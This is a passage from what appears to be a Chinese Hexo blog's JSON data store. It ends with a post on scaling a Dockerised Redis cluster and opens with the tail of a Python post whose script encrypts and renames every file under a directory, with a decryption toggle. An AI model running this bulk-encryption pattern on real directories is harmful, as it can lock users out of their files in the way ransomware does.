filename[::-1][6:][::-1]</span><br><span class=\"line\">    filename_base64 = filename[::-1] + <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    filename_bytes_base64 = filename_base64.encode(<span class=\"string\">&#x27;ascii&#x27;</span>)  <span class=\"comment\"># encode as ASCII</span></span><br><span class=\"line\">    ori_filename = base64.decodebytes(filename_bytes_base64).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    new_filename = ori_filename</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, f))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, f), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密代码</span></span><br><span class=\"line\"><span class=\"comment\"># def Main(rootDir):</span></span><br><span class=\"line\"><span class=\"comment\">#     list_dirs = os.walk(rootDir)</span></span><br><span class=\"line\"><span class=\"comment\">#     for root, dirs, files in list_dirs:</span></span><br><span class=\"line\"><span class=\"comment\">#         if False:</span></span><br><span class=\"line\"><span class=\"comment\">#             # 遍历文件，加密并且改名</span></span><br><span class=\"line\"><span class=\"comment\">#             for f in files:</span></span><br><span class=\"line\"><span class=\"comment\">#                 filename = os.path.join(root, f)</span></span><br><span class=\"line\"><span class=\"comment\">#                 Encrypt(filename)</span></span><br><span class=\"line\"><span class=\"comment\">#                 RenameFile(root, f)</span></span><br><span class=\"line\"><span class=\"comment\">#         else:</span></span><br><span class=\"line\"><span class=\"comment\">#             # 遍历文件，解密并且恢复名字</span></span><br><span class=\"line\"><span class=\"comment\">#             for f in files:</span></span><br><span class=\"line\"><span class=\"comment\">#                 if f.endswith(&#x27;.liuxp&#x27;):</span></span><br><span class=\"line\"><span class=\"comment\">#                     filename = os.path.join(root, f)</span></span><br><span class=\"line\"><span class=\"comment\">#                     Descrypt(filename)</span></span><br><span class=\"line\"><span class=\"comment\">#                     ReserveFilename(root, f)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密代码</span></span><br><span class=\"line\">def Main(rootDir):</span><br><span class=\"line\">    list_dirs = os.walk(rootDir)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> root, <span class=\"built_in\">dirs</span>, files <span class=\"keyword\">in</span> list_dirs:</span><br><span class=\"line\">        <span class=\"comment\"># 切换加密和解密过程</span></span><br><span class=\"line\">        <span class=\"comment\"># if False:   # 解密文件</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> True:  <span class=\"comment\"># 加密文件</span></span><br><span class=\"line\">            <span class=\"comment\"># 遍历文件，加密并且改名</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">                filename = os.path.join(root, f)</span><br><span class=\"line\">                Encrypt(filename)</span><br><span class=\"line\">                RenameFile(root, f)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 遍历文件，解密并且恢复名字</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">                filename = os.path.join(root, f)</span><br><span class=\"line\">                Descrypt(filename)</span><br><span class=\"line\">                ReserveFilename(root, f)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># CreateRSAKeys()</span></span><br><span class=\"line\">    d = <span class=\"string\">&quot;e://test/&quot;</span></span><br><span class=\"line\">    Main(d)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。</p>\n<p>以下是几个实现的效果图：</p>\n<p><img src=\"/2023/04/17/Python-encrypted-file/1.png\" alt=\"加密之前\"></p>\n<p><img src=\"/2023/04/17/Python-encrypted-file/2.png\" alt=\"加密之后\"></p>\n<p><img src=\"/2023/04/17/Python-encrypted-file/3.png\" alt=\"解密之后\"></p>\n<h3 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h3><p>此代码仅作为学习测试使用，前来<em><strong>学习</strong></em>的小伙伴还是要遵规守纪啊！！！</p>\n<p>此代码仅作为学习测试使用，前来<em><strong>学习</strong></em>的小伙伴还是要遵规守纪啊！！！</p>\n<p>此代码仅作为学习测试使用，前来<em><strong>学习</strong></em>的小伙伴还是要遵规守纪啊！！！</p>"},{"title":"Redis扩容案例","date":"2023-08-14T12:26:42.000Z","_content":"\n### 操作步骤\n\n1. 新建两个容器\n\n```bash\ndocker run -d --name redis-node-7 --net host --privileged=true -v /docker/redis/share/redis-node-7:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6387\ndocker run -d --name redis-node-8 --net host --privileged=true -v /docker/redis/share/redis-node-8:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6388\n```\n\n<!-- more -->\n\n2. 进入7号容器（新建的容器）\n\n```bash\ndocker exec -it redis-node-7 bash\n```\n\n3. 使7号容器加入集群\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6387 192.168.1.42:6381\n```\n\n前面写的是本容器的IP:端口，后面跟着是集群领路人的IP:端口。执行后出现如下的提示信息表示成功：\n\n```bash\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n>>> Send CLUSTER MEET to node 192.168.1.42:6387 to make it join the cluster.\n[OK] New node added correctly.\n```\n\n4. 查看集群的节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:8371\n```\n\n效果：\n\n```bash 折叠代码\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots: (0 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\n```\n\n从以上的效果可以看到，端口被6387的节点已经成功添加进来，但是并没有像其他的Master主机一样分配到槽位。所以从实际意义上来说，它还不算正式加入集群。\n\n5. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n后面接着的IP还是集群的领路人。\n\n执行后，要求我们输入每台分配多少个槽号，简单计算一下，一共16384个槽号，4台机器分，每台4096个槽号。\n\n然后下面输入新加入的机器的节点ID。\n\n输入all，最后输入yes确认。\n\n```bash\nHow many slots do you want to move (from 1 to 16384)? 4096\nWhat is the receiving node ID? 791172307abf9223425af595e661cec441951170\nPlease enter all the source node IDs.\n  Type 'all' to use all the nodes as source nodes for the hash slots.\n  Type 'done' once you entered all the source nodes IDs.\nSource node #1: all\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n```bash 折叠代码\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 4096 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 4096 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n从概略信息可以看到4台机器都分配到了槽号，从下面的详细槽号信息，我们可以观察出，新加入的6387机器分配到的槽号是由其他3台主机各匀过来的。\n\n7. 为新加入的Master主机添加Slave主机\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6388 192.168.1.42:6387 --cluster-slave --cluster-master-id 791172307abf9223425af595e661cec441951170\n```\n\n* 192.168.1.42:6388 Slave主机的IP:端口\n\n* 192.168.1.42:6387 Master主机的IP:端口\n\n* 最后加要挂载的Master主机的节点ID\n\n8. 查看节点信息\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692019970307 7 connected 1365-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692019967000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692019968297 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692019965000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692019968000 2 connected 6827-10922\n8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388@16388 slave 791172307abf9223425af595e661cec441951170 0 1692019967000 8 connected\n791172307abf9223425af595e661cec441951170 192.168.1.42:6387@16387 master - 0 1692019967293 8 connected 0-1364 5461-6826 10923-12287\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692019970000 3 connected 12288-16383\n127.0.0.1:6381> \n```","source":"_posts/RedisAdd.md","raw":"---\ntitle: Redis扩容案例\ndate: 2023-08-14 20:26:42\ncategories: 技术\ntags:\n  - Docker\n  - Redis\n---\n\n### 操作步骤\n\n1. 新建两个容器\n\n```bash\ndocker run -d --name redis-node-7 --net host --privileged=true -v /docker/redis/share/redis-node-7:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6387\ndocker run -d --name redis-node-8 --net host --privileged=true -v /docker/redis/share/redis-node-8:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6388\n```\n\n<!-- more -->\n\n2. 进入7号容器（新建的容器）\n\n```bash\ndocker exec -it redis-node-7 bash\n```\n\n3. 使7号容器加入集群\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6387 192.168.1.42:6381\n```\n\n前面写的是本容器的IP:端口，后面跟着是集群领路人的IP:端口。执行后出现如下的提示信息表示成功：\n\n```bash\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n>>> Send CLUSTER MEET to node 192.168.1.42:6387 to make it join the cluster.\n[OK] New node added correctly.\n```\n\n4. 查看集群的节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:8371\n```\n\n效果：\n\n```bash 折叠代码\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots: (0 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\n```\n\n从以上的效果可以看到，端口被6387的节点已经成功添加进来，但是并没有像其他的Master主机一样分配到槽位。所以从实际意义上来说，它还不算正式加入集群。\n\n5. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n后面接着的IP还是集群的领路人。\n\n执行后，要求我们输入每台分配多少个槽号，简单计算一下，一共16384个槽号，4台机器分，每台4096个槽号。\n\n然后下面输入新加入的机器的节点ID。\n\n输入all，最后输入yes确认。\n\n```bash\nHow many slots do you want to move (from 1 to 16384)? 4096\nWhat is the receiving node ID? 791172307abf9223425af595e661cec441951170\nPlease enter all the source node IDs.\n  Type 'all' to use all the nodes as source nodes for the hash slots.\n  Type 'done' once you entered all the source nodes IDs.\nSource node #1: all\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n```bash 折叠代码\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 4096 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 4096 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n从概略信息可以看到4台机器都分配到了槽号，从下面的详细槽号信息，我们可以观察出，新加入的6387机器分配到的槽号是由其他3台主机各匀过来的。\n\n7. 为新加入的Master主机添加Slave主机\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6388 192.168.1.42:6387 --cluster-slave --cluster-master-id 791172307abf9223425af595e661cec441951170\n```\n\n* 192.168.1.42:6388 Slave主机的IP:端口\n\n* 192.168.1.42:6387 Master主机的IP:端口\n\n* 最后加要挂载的Master主机的节点ID\n\n8. 查看节点信息\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692019970307 7 connected 1365-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692019967000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692019968297 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692019965000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692019968000 2 connected 6827-10922\n8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388@16388 slave 791172307abf9223425af595e661cec441951170 0 1692019967000 8 connected\n791172307abf9223425af595e661cec441951170 192.168.1.42:6387@16387 master - 0 1692019967293 8 connected 0-1364 5461-6826 10923-12287\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692019970000 3 connected 12288-16383\n127.0.0.1:6381> \n```","slug":"RedisAdd","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5eg003f7zj3h5jed20q","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>新建两个容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name redis-node-7 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-7:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6387</span><br><span class=\"line\">docker run -d --name redis-node-8 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-8:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6388</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>进入7号容器（新建的容器）</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it redis-node-7 bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>使7号容器加入集群</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster add-node 192.168.1.42:6387 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>前面写的是本容器的IP:端口，后面跟着是集群领路人的IP:端口。执行后出现如下的提示信息表示成功：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; Check <span class=\"keyword\">for</span> open slots...</span><br><span class=\"line\">&gt;&gt;&gt; Check slots coverage...</span><br><span class=\"line\">[OK] All 16384 slots covered.</span><br><span class=\"line\">&gt;&gt;&gt; Send CLUSTER MEET to node 192.168.1.42:6387 to make it <span class=\"built_in\">join</span> the cluster.</span><br><span class=\"line\">[OK] New node added correctly.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>查看集群的节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:8371</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.42:6386 (849a82f0...) -&gt; 0 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 5462 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6387 (79117230...) -&gt; 0 keys | 0 slots | 0 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\"></span><br><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[0-5460] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[5461-10922] (5462 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots: (0 slots) master</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[10923-16383] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>从以上的效果可以看到，端口被6387的节点已经成功添加进来，但是并没有像其他的Master主机一样分配到槽位。所以从实际意义上来说，它还不算正式加入集群。</p>\n<ol start=\"5\">\n<li>重新分配槽号</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster reshard 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>后面接着的IP还是集群的领路人。</p>\n<p>执行后，要求我们输入每台分配多少个槽号，简单计算一下，一共16384个槽号，4台机器分，每台4096个槽号。</p>\n<p>然后下面输入新加入的机器的节点ID。</p>\n<p>输入all，最后输入yes确认。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">How many slots <span class=\"keyword\">do</span> you want to move (from 1 to 16384)? 4096</span><br><span class=\"line\">What is the receiving node ID? 791172307abf9223425af595e661cec441951170</span><br><span class=\"line\">Please enter all the <span class=\"built_in\">source</span> node IDs.</span><br><span class=\"line\">  Type <span class=\"string\">&#x27;all&#x27;</span> to use all the nodes as <span class=\"built_in\">source</span> nodes <span class=\"keyword\">for</span> the <span class=\"built_in\">hash</span> slots.</span><br><span class=\"line\">  Type <span class=\"string\">&#x27;done&#x27;</span> once you entered all the <span class=\"built_in\">source</span> nodes IDs.</span><br><span class=\"line\">Source node <span class=\"comment\">#1: all</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>再次查看集群节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.42:6386 (849a82f0...) -&gt; 0 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6387 (79117230...) -&gt; 0 keys | 4096 slots | 0 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\"></span><br><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[1365-5460] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>从概略信息可以看到4台机器都分配到了槽号，从下面的详细槽号信息，我们可以观察出，新加入的6387机器分配到的槽号是由其他3台主机各匀过来的。</p>\n<ol start=\"7\">\n<li>为新加入的Master主机添加Slave主机</li>\n</ol>\n<figure 